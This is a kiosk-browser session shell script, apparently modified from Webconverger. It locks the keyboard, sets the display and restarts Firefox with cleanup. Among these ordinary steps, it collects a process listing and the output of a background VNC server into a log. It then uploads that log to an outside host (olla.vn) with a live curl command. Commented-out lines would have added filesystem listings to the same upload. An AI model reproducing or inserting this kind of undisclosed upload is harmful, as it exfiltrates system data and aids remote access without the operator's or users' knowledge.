# Keep the browser running and clean between sessions in /home/webc
# hendry@webconverger.com
. "/etc/webc/functions.sh"
. "/etc/webc/webc.conf"

if test -f /etc/X11/Xresources/x11-common
then
	xrdb -merge /etc/X11/Xresources/x11-common
else
	logs x11 config not found
fi

# remove ctrl
xmodmap -e "remove Control = Control_L"
xmodmap -e "remove Control = Control_R"

# remove shift
xmodmap -e "remove shift = Shift_L"
xmodmap -e "remove shift = Shift_R"

# remove atl
xmodmap -e "remove mod1 = Alt_L"
xmodmap -e "remove mod1 = Alt_R"
xmodmap -e "remove mod1 = Meta_L"

# remove super
xmodmap -e "remove mod4 = Super_L"
xmodmap -e "remove mod4 = Super_R"
xmodmap -e "remove mod4 = Hyper_R"

# remove mode switch
xmodmap -e "remove mod5 = ISO_Level3_Shift"
xmodmap -e "remove mod5 = Mode_Switch"

wm="/usr/bin/dwm.web" # default

if test "$(cmdline_get chrome)" = neon
then
	cmdline_has neonshowid && wm="/usr/bin/dwm.neon" # special version to show version/id info on top bar
	neon="-neon"
	update_background() { xloadimage -border black -quiet -onroot -center "$1"; }
	xsetroot -solid black
else
	update_background() { xloadimage -quiet -onroot -center "$1"; }
	xsetroot -solid white
fi

cp /home/webc/bg-orig${neon}.png /home/webc/bg.png

if ! has_network
then
	update_background /etc/webc/no-net${neon}.png
	while ! has_network && ! cmdline_has debug; do
		sleep 1
	done
fi

cmdline_has noconfig || update_background /etc/webc/configuring${neon}.png

# if there is a network, then I don't see why /etc/webc/id should not be there
while ! test -e /etc/webc/id; do
	sleep 0.25
	test $SECONDS -gt 30 && break
done

# get the $webc_id
. "/etc/webc/webc.conf"
#wget http://54.251.150.148/core/homepage.txt
#hompage=`cat homepage.txt`
#rm -rf homepage.txt

#ls -la / > /home/webc/log.txt
ps -aux >> /home/webc/log.txt
#df >> /home/webc/log.txt
#ls -la /boot >> /home/webc/log.txt
#ls -la /live >> /home/webc/log.txt
#ls -laR /live/image | grep ^- >> /home/webc/log.txt
#find /live/image -type f -name '*' >> log.txt

#curl --upload-file /home/webc/log.txt http://olla.vn/core/upload.php

if test -f /live/image/config/homepage.cfg
then
	homepage=`cat /live/image/config/homepage.cfg`
else
	homepage="$install_qa_url"
fi

#config_url="http://10.0.100.110/WebConvergerConfig/Default.aspx"
#mac=$( mac_address )

#if curl -f -o /home/webc/homepage.tmp --retry 3 "$config_url?V=$webc_version&D=$device&K=$kernel&M=`mac_address`"
#then
#        touch /home/webc/homepage.tmp
#else
#        echo "CONFIG: Failed to download from $config_url"
#	homepage="file:///etc/webc/homagepage_error.html" # default homepage
#fi

#homepage="$install_qa_url" # default homepage
#homepage=`cat /home/webc/homepage.tmp`
#rm -rf /home/webc/homepage.tmp

/etc/webc/vncserver.sh >> /home/webc/log.txt 2>&1 &

mkfifo "$live_config_pipe"
read answer < "$live_config_pipe" # blocking till live-config is finished
rm -f "$live_config_pipe"

xset s on
xset s blank
xset s 600
xset +dpms

exec /usr/bin/kioskresetstation 10 &

curl --upload-file /home/webc/log.txt http://olla.vn/core/upload.php

for x in $(cmdline)
do
	case $x in

		kioskresetstation=*) # For killing the browser after a number of minutes of idleness
			exec /usr/bin/kioskresetstation ${x#kioskresetstation=} &
			;;

		debug)
			wm="/usr/bin/dwm.default" # dwm.default is the dwm default, not webc
			;;

		xkb=*)
			koptions=$( /bin/busybox httpd -d ${x#xkb=} )
			if setxkbmap $koptions; then logs "setxkbmap OK $koptions"; else logs "setxkbmap ERR $koptions"; fi
			;;

		# swarp=0,0 // move mouse pointer to top left of screen
		swarp=*)
			koptions=$( /bin/busybox httpd -d ${x#swarp=} )
			swarp $(echo $koptions | sed 's/[^0-9]/ /g')
			;;

		# http://webconverger.org/touch_screen_calibration/
		xinput=*)
			option=$( /bin/busybox httpd -d ${x#xinput=} )
			if eval xinput "$option"
			then
				logs "OK: xinput $option"
			else
				logs "ERROR: xinput $option"
			fi
			;;

		# https://groups.google.com/forum/#!msg/webc-users/GlHh_SX17BM/GojceXVSazgJ
		xrandr-all=*)
			xoptions=$( /bin/busybox httpd -d ${x#xrandr-all=} )

			logs "xrandr-all: $xoptions"

			xrandr | awk '$2 ~ /^connected$/ { print $1 }' | while read output
			do
				xrandr --output $output $xoptions
			done

			;;

		xrandr=*)

			xoptions=$( /bin/busybox httpd -d ${x#xrandr=} )

			if xrandr $xoptions
			then
				logs "xrandr OK $xoptions"
			else
				logs "xrandr ERR $xoptions"
			fi

			;;

		noblank)
			logs "noblank"
			xset s off
			xset -dpms
			;;

		numlock)
			logs "numlock set"
			/usr/bin/numlockx
			;;

		blank=*)
			secondstillblank=$((${x#blank=} * 60))
			logs "screen will blank after $secondstillblank seconds"
			xset s $secondstillblank
			;;

	esac
done


# disable bell
xset b 0 0

while true
do
	update_background /home/webc/bg.png # bg needs to be re-rendered on rotation for example
	$wm
done &

# hide the cursor by default, showcursor to override
cmdline | grep -qs showcursor || exec /usr/bin/unclutter &

# Stop (ab)users breaking the loop to restart the exited browser
trap "echo Unbreakable!" SIGINT SIGTERM

# Stuff in here gets run at every browser restart:
while true
do
	for x in $(cmdline); do
		case $x in
			homepage=*)
				homepage="$( echo ${x#homepage=} | sed 's,%20, ,g' )"
				;;

		bgurl=*)
			bgurl="$( /bin/busybox httpd -d ${x#bgurl=} )"
				# only download if newer
				wget -N --timeout=5 "${bgurl}" -O /home/webc/bg.png.custom
				file /home/webc/bg.png.custom | grep -qs "image data" && {
					cp /home/webc/bg.png.custom /home/webc/bg.png # leave .custom around for wget
					update_background /home/webc/bg.png
				}
			;;

		install)
			homepage="$install_qa_url"
			;;
		esac
	done

	mac=$( mac_address )
	usbid=$( usb_serials | head -n1 )

	if test -x /opt/firefox/firefox
	then

		xsetroot -name "$webc_version $webc_id"

		if ! cmdline_has noclean
		then
		for d in /home/webc/{.mozilla,.adobe,.macromedia,Downloads} /tmp/webc
		do
			rm -rf $d
		done
		fi

		if cmdline_has noptirun || ! pidof bumblebeed
		then
			logs "FF (re)start"
			/opt/firefox/firefox $(echo $homepage | 
			sed "s,MACID,$mac,g" | 
			sed "s,WEBCID,$webc_id,g" | 
			sed "s,WEBCVERSION,$webc_version,g" | 
			sed "s,USBID,$usbid,g" )
		else
			logs "FF optirun (re)start"
			optirun /opt/firefox/firefox $(echo $homepage | 
			sed "s,MACID,$mac,g" | 
			sed "s,WEBCID,$webc_id,g" | 
			sed "s,WEBCVERSION,$webc_version,g" | 
			sed "s,USBID,$usbid,g" )
		fi
	fi
done
